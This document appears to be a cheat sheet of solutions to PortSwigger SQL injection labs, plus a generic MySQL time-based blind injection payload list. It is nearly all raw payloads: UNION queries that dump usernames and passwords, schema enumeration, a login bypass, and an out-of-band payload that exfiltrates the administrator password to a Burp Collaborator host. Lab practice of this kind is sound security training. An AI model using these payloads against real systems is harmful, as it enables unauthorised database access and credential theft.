### Portswigger Labs

## SQL injection UNION attack, determining the number of columns returned by the query
# Keep adding NULL until the error disappears
'+UNION+SELECT+NULL,NULL--
'+UNION+SELECT+NULL,NULL--

## SQL injection UNION attack, finding a column containing text
'+UNION+SELECT+NULL,NULL,NULL--
'+UNION+SELECT+'abcdef',NULL,NULL--

## SQL injection UNION attack, retrieving data from other tables
'+UNION+SELECT+'abc','def'--.
'+UNION+SELECT+username,+password+FROM+users--

## SQL injection UNION attack, retrieving multiple values in a single column
'+UNION+SELECT+NULL,'abc'--
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--

## SQL injection attack, querying the database type and version on Oracle
'+UNION+SELECT+'abc','def'+FROM+dual--
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--

## SQL injection attack, querying the database type and version on MySQL and Microsoft
'+UNION+SELECT+'abc','def'#
'+UNION+SELECT+@@version,+NULL#

## SQL injection attack, listing the database contents on non-Oracle databases
'+UNION+SELECT+'abc','def'--.
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--

## SQL injection attack, listing the database contents on Oracle
'+UNION+SELECT+'abc','def'+FROM+dual--
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--

## Blind SQL injection with time delays
TrackingId=x'||pg_sleep(10)--

## Blind SQL injection with out-of-band interaction
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//YOUR-COLLABORATOR-ID.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--.

## Blind SQL injection with out-of-band data exfiltration
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR-COLLABORATOR-ID.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--.

## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
'+OR+1=1--

## SQL injection vulnerability allowing login bypass
administrator'--

#### MySQL Blind (Time Based) Payload list:

- 0'XOR(if(now()=sysdate(), sleep (5),0)) XOR'Z
- 0'XOR(if(now()=sysdate(), sleep(5*1),0))XOR'Z
- if(now()=sysdate(), sleep (5),0)
- 'XOR(if(now()=sysdate(), sleep(5),0))XOR'
- 'XOR(if(now()=sysdate(), sleep(5*1),0))OR'
- if(now()=sysdate(), sleep (5),0)/"XOR(if (now()=sysdate(), sleep(5),0))OR"/
- if(now()=sysdate(), sleep (5),0)/*'XOR(if(now()=sysdate(), sleep(5),0))OR' "XOR(if(now()=sysdate(), sleep (5),0))OR"*/
- if(now()=sysdate(), sleep(5),0)/'XOR(if (now()=sysdate(),sleep(5),0))OR' "XOR(if(now()=sysdate(), sleep (5),0) and 5=5)"/
- SLEEP(5)/*' or SLEEP(5) or '" or SLEEP(5) or "*/
- %2c(select%5+%5from%5(select(sleep(5)))a)
- (select(0)from(select(sleep(5)))v)
- (SELECT SLEEP(5))
- '%2b(select*from(select(sleep(5)))a)%2b'
- (select*from(select(sleep(5)))a)
- 1'%2b(select*from(select(sleep(5)))a)%2b'
- (select * from (select(sleep(5)))a)
- desc%2c(select*from(select(sleep (5)))a)
- -1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(5))Α))
- 1+or+1=((SELECT+1+FROM+(SELECT+SLEEP(5))A)) - (SELECT * FROM (SELECT(SLEEP(5)))YYYY)
- (SELECT * FROM (SELECT(SLEEP(5)))YYYY)#
- (SELECT * FROM (SELECT(SLEEP(5)))YYYY) --
- '+(select*from(select(sleep(5)))a)+'
- select(0)from(select(sleep(5)))v)%2f'+ (
- (select(0)from(select(sleep(5)))v)+'"
- (select(0)from(select(sleep(5)))v)%2f*'+
- (select(0)from(select(sleep(5)))v)+'"+
- (select(0)from(select(sleep(5)))v)+"*%2f
- (select(0)from(select(sleep(5)))v)/*'+
- (select(0)from(select(sleep(5)))v)+'"+
- (select(0)from(select(sleep(5)))v)+"*/
- ',''), /*test*/%26%26%09sLeEp(5)%09--+
